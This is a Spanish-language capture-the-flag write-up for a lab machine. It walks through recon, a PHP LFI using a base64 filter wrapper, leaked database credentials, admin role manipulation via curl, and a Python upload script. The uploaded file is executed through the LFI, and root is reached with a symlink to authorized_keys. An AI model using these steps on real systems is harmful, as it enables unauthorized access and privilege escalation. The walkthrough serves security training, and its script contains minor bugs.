--------
- Tags: #change-date #lfi #lfi-wrapper #base64-wrapper #file-upload #sudoers #symbolic-link #python-scripting #bash-scripting 
-  ---------------
## Técnicas utilizadas
- Local File Inclusion (LFI)  
- Using Wrappers - Base64 Wrapper  
- Code Inspection  
- Role manipulation  
- File Upload Exploitation  
- Abusing Sudoers Privilege - Playing with symbolic links
## Procedimiento

![[Pasted image 20230727140213.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, podemos encontrar estos puertos abiertos:
```ruby
# nmap -sCV -p22,80 10.10.11.135 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 00:09 MST
Nmap scan report for 10.10.11.135
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d25c40d7c9feffa883c36ecd6011d2eb (RSA)
|   256 18c9f7b92736a116592335843431b3ad (ECDSA)
|_  256 a22deedb4ebff93f8bd4cfb412d820f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
```

Un escaneo sobre las tecnologías web con **whatweb** nos muestra el siguiente resultado:
```ruby
# whatweb 10.10.11.135
http://10.10.11.135 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], RedirectLocation[./login.php]
http://10.10.11.135/login.php [200 OK] Apache[2.4.29], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[#,dkstudioin@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], JQuery, Script, Title[Simple WebApp]
```

---------
#### Local File Inclusion (LFI)  
Visitando la web, nos encontramos un **Login** el cual parece no ser vulnerable a ningun tipo de inyección. Dado que no hay nada más en lo que apoyarnos, además de que no hay ningun otro puerto interesante, empezaremos a fuzzear por directorios y luegos por archivos con **wfuzz** aunque también se puede utilizar **gobuster**:
```
# wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-html-txt "http://10.10.10.10/FUZZ.FUZ2Z"
```

Encontramos los siguientes archivos disponibles:
![[Pasted image 20230728085516.png]]

Ahora con estos archivos, podemos intentar fuzzear por parametros disponibles:
```
# wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://10.10.10.10/image?FUZZ=hola"
```

Con este archivo y con el parametro descubierno, podemos intentar colarle un **LFI** para incluir archivos de la maquina. Intentando un Path Trasveral y algunos de los tipicos **Bypass** para **LFI** no podemos llegar a nada realmente. 
![[Pasted image 20230728090003.png]]

--------
#### Using Wrappers - Base64 Wrapper  
Por otro lado, usando algunos de los wroppers más comunes podemos llegar listar archivos de la maquina:
```
http://10.10.10.10/image?img=php://filter/convert.base64-encode/resource=/etc/passwd
```

Decodeando esto, vemos un usuario **Aaron**. Pues bien, si intentamos loguearnos en la pagina principal como **Aaron:Aaron** vemos que cuela.

-------------
#### Code Inspection
Aprovechandonos del **LFI** anterior, intentaremos listar algunos de los archivos que estan en la web.
Aqui podemos observar el script que es vulnerable a **LFI**:
```php
<?php

function is_safe_include($text)
{
	# No contempla el php://filter/convert.base64-encode/resource=/etc/passwd
    $blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");
    foreach ($blacklist as $item) {
        if (strpos($text, $item) !== false) {
            return false;
        }
    }
    return substr($text, 0, 1) !== "/";
}
if (isset($_GET['img'])) {
    if (is_safe_include($_GET['img'])) {
        include($_GET['img']);
    } else {
        echo "Hacking attempt detected!";
    }
}
```

En el blacklist, no tienen contemplado el **Wrapper** de codificación en **Base64**. Enumerando archivos de la propia maquina, llegamos a un que tiene una pinta jugoza: **admin_auth_check.php**. Este archivo contiene algunas comprobaciones para ver si somos **admin**. Este mismo, incluye un archivo de nombre **auth_check.php** que si lo analizamos con atención no llegamos a completamente nada ( xd ). Listando algunos de los archivos que encontramos con anterioridad en la web, encontramos con unas crdenciales para conectarnos a una base de datos:
```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
?>
```

Indagando más, encontramos un archivo en **js/profile.js**:
```javascript
function updateProfile() {
    var xml = new XMLHttpRequest();
    xml.onreadystatechange = function () {
        if (xml.readyState == 4 && xml.status == 200) {
            document.getElementById("alert-profile-update").style.display = "block"
        }
    };

    xml.open("POST", "profile_update.php", true);
    xml.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xml.send("firstName=" + document.getElementById("firstName").value + "&lastName=" + document.getElementById("lastName").value + "&email=" + document.getElementById("email").value + "&company=" + document.getElementById("company").value);
}
```

Este, esta tramitando una solicitud a un archivo el cual de primeras es para hacerle un **update** al perfil. Ahora, si listamos este archivo a través del **LFI** vemos la estructura de datos que tenemos que tramitar para hacer un cambio en nuestro perfil:
```php
<?php
include "auth_check.php";
$error = "";
if (empty($_POST['firstName'])) {
    $error = 'First Name is required.';
} else if (empty($_POST['lastName'])) {
    $error = 'Last Name is required.';
} else if (empty($_POST['email'])) {
    $error = 'Email is required.';
} else if (empty($_POST['company'])) {
    $error = 'Company is required.';
}
if (!empty($error)) {
    die("Error updating profile, reason: " . $error);
} else {

    include "db_conn.php";

    $id = $_SESSION['userid'];
    $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $result = $statement->execute(array('id' => $id));
    $user = $statement->fetch();

    if ($user !== false) {

        ini_set('display_errors', '1');
        ini_set('display_startup_errors', '1');
        error_reporting(E_ALL);

        $firstName = $_POST['firstName'];
        $lastName = $_POST['lastName'];
        $email = $_POST['email'];
        $company = $_POST['company'];
        $role = $user['role'];

        if (isset($_POST['role'])) {
            $role = $_POST['role'];
            $_SESSION['role'] = $role;
        }


        // dont persist role
        $sql = "UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id";

        $stmt = $pdo->prepare($sql);
        $stmt->execute();

        $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
        $result = $statement->execute(array('id' => $id));
        $user = $statement->fetch();

        // but return it to avoid confusion
        $user['role'] = $role;
        $user['6'] = $role;

        echo json_encode($user, JSON_PRETTY_PRINT);

    } else {
        echo "No user with this id was found.";
    }
}
?>
```

---------
#### Role manipulation  
En el codigo, encontramos que si tramitamos una petición donde si contemplamos el parametro role podemos tornarlo a **1** y ser administradores:
```json
# curl -s -X POST "http://10.10.10.10/profile_update.php" --data 'firstName=Sexcott&lastName=Sexcott&email=Sexcott@sexcott.com&company=Sexcott&role=1' 
```

----------
#### File Upload Exploitation 
para ahorrarnos el tiempo, podemos programar algo en python que nos automatice todo:
```python
#!/usr/bin/python3

import requests
import pdb
import time
import signal

def def_handler(sig, frame):
	print("\n[!] Saliendo...!")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.10.10.10/login.php?login=true"
upload_file = "http://10.10.10.10/upload.php"
update_profile_url = "http://10.10.10.10/profile_update.php"
admin_check_url = "http://10.10.10.10/admin_auth_check.php"

def makeRequest():

	s = requests.session()

	post_data = {
		'user' : 'aaron',
		'password' : 'aaron'
	}

	r = s.post(login_url, data=post_data)

	post_data = {
		'firstName' : 'test',
		'lastName' : 'test',
		'email' : 'test@test.htb',
		'company' : 'test',
		'role' : '1'
	}

	r = s.post(update_profile_url, data=post_data)
	
	with open("pwned.jpg", "rb") as img:
		uploadedFile = {'fileToUpload' : ('pwned.jpg', img)}

		r = s.post(upload_url, files=uploadedFile)
		print(r.text)

if __name__ == "__main__":
	makeRequest()
```

Ahora, para calcular el nombre de archivo, podemos hacer esto con **Php Interactive** a la par que subimos el archivo para posteriormente hacer una resta:
```
# php --interactive
> echo time(); # ejectuamos el script en python3 a la par que este comando
> echo md5('$file_hash' . "130204") . "_" . "pwned.jpg";
5f128b89198f891273ab18273fa
```

Ahora, simplemente intentamos listar el archivo en la siguiente ruta:
`http://10.10.10.10/images/uploads/<hash>_pwned.jgp` 

Y nos muestra simplemente un error. Pues ahora si, podriamos aprovecharnos del LFI para apuntar a este y ejecutar comandos:
![[Pasted image 20230728170423.png]]

#### Abusing Sudoers Privilege - Playing with symbolic links
Dentro de la maquina, si enumerarmos un poco, podemos dar un con **backup** dentro de la ruta **/opt/** con el cual podemos crear una copia y colocarlo en **/var/www/html/backup.zip** para descargarlo y verlo desde nuestra maquina.

Al descomprirlo, nos percatamos que es un proyecto en **Git**, asi que podemos intentar listar algunas cosas como los **logs**. Hay uno que nos dice que se cambio algo del archivo de conexión a la base de datos:
![[Pasted image 20230728170757.png]]

Con esta nueva contraseña, podemos iniciar sesion como **Aaron** por **Ssh**, si listamos nuestros privilegios a nivel de sudoers nos encontramos con que podemos ejecutar **netutiles** como el usuario que deseemos. Este binario, simplemente nos permite descargar archivos de nuestra maquina y lo almance en la maquina victima, pero, como este archivo lo descarga **root** y lo almacena **root**, podriamos abusar de esto para crear un link simbolico de nuestro **id_rsa.pub** hacia el **authorized_keys** de **root**:
```
ln -s -f id_rsa.pub /root/.ssh/authorized_keys
```

